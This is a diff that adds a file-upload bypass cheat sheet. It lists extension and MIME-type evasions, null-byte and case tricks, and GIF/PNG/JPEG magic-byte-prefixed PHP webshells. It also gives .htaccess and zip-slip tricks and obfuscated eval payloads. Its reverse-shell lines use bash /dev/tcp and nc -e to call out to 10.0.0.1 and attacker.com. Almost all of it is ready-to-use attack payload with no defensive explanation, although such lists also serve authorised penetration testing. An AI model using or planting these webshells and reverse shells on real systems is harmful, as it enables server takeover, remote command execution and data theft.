@@ -1,0 +1,141 @@
+# File Upload Bypass Techniques
+# MIME type bypass
+# Upload with wrong Content-Type header
+- application/octet-stream instead of image/jpeg
+- text/plain instead of application/pdf
+- application/x-php disguised as image/png
+
+# Extension bypass
+shell.php.jpg
+shell.jpg.php
+shell.php%20.jpg
+shell.php%00.jpg
+shell.php::$DATA.jpg
+shell.php:::jpg
+shell.phtml
+shell.php3
+shell.php4
+shell.php5
+shell.phar
+shell.phps
+shell.php7
+shell.shtml
+shell.htaccess
+
+# Double extension
+shell.php.png
+shell.jpg.php
+image.php.gif
+shell.php.txt
+
+# Null byte injection
+shell.php%00.jpg
+shell.php%00.png
+shell.php%00.gif
+
+# Case variation
+Shell.PHP
+SHELL.PHP
+ShEll.PhP
+shell.pHp
+
+# Alternate executables (PHP)
+shell.phtml
+shell.php3
+shell.php4
+shell.php5
+shell.php7
+shell.phps
+shell.phar
+shell.shtml
+shell.inc
+
+# Alternate executables (ASP/ASPX)
+shell.asp
+shell.aspx
+shell.cer
+shell.asa
+shell.cdx
+shell.idc
+
+# Alternate executables (JSP)
+shell.jsp
+shell.jspx
+shell.jspf
+shell.jsw
+shell.jsv
+shell.jspf
+shell.war
+
+# Magic bytes / File signature
+GIF89a<?php system($_GET['cmd']); ?>
+\xFF\xD8\xFF\xE0<?php system($_GET['cmd']); ?>
+\x89PNG\r\n\x1a\n<?php system($_GET['cmd']); ?>
+
+# TIFF header
+\x49\x49\x2A\x00<?php system($_GET['cmd']); ?>
+
+# Polyglot file (valid image + PHP)
+JPG header + PHP code mixed in comment section
+PNG IHDR + PHP code in text chunk
+
+# Archive-based bypass
+shell.zip containing shell.php
+shell.rar containing shell.php
+shell.tar containing shell.php
+
+# Content-Type header bypass via multipart
+Content-Type: image/jpeg (but actual PHP code)
+Content-Type: image/png (but actual PHP code)
+
+# Encoding bypass
+Base64 encoded PHP: base64_decode($_POST['file'])
+URL encoded PHP: urldecode($_POST['file'])
+
+# Filename manipulation
+../shell.php (directory traversal)
+..\\shell.php (Windows traversal)
+../../upload/shell.php
+shell.php?param=value
+shell.php#.jpg
+
+# Htaccess + PHP upload
+.htaccess: AddType application/x-httpd-php .jpg
+Then upload as shell.jpg
+
+# Server-side misconfig
+.htaccess + .jpg = executes as PHP
+web.config bypass (IIS)
+.user.ini + .jpg (PHP)
+
+# Reverse shell payloads (PHP)
+<?php exec("/bin/bash -c 'bash -i >& /dev/tcp/10.0.0.1/4444 0>&1'"); ?>
+<?php system('nc -e /bin/sh attacker.com 4444'); ?>
+<?php passthru('whoami'); ?>
+
+# Webshell one-liners (PHP)
+<?php system($_GET['c']); ?>
+<?php passthru($_REQUEST['cmd']); ?>
+<?php exec($_GET['cmd']); ?>
+<?php shell_exec($_POST['cmd']); ?>
+<?php eval($_POST['code']); ?>
+
+# Obfuscated PHP
+<?php eval(base64_decode("c3lzdGVtKCRfR0VUWydjJ10pOw==")); ?>
+<?php eval(gzuncompress(base64_decode("..."))); ?>
+
+# Mixed case/encoding bypass
+sHeLL.pHp
+shell.p%48p
+shell.p%48p
+%73hell.php
+
+# Alternate upload endpoints
+/upload.php?file=shell.php
+/api/upload/shell.php
+/admin/upload/shell.php
+/files/shell.php
+
+# Zip slip (directory traversal in archive)
+../../../shell.php (inside zip)
+../../shell.php (inside tar)
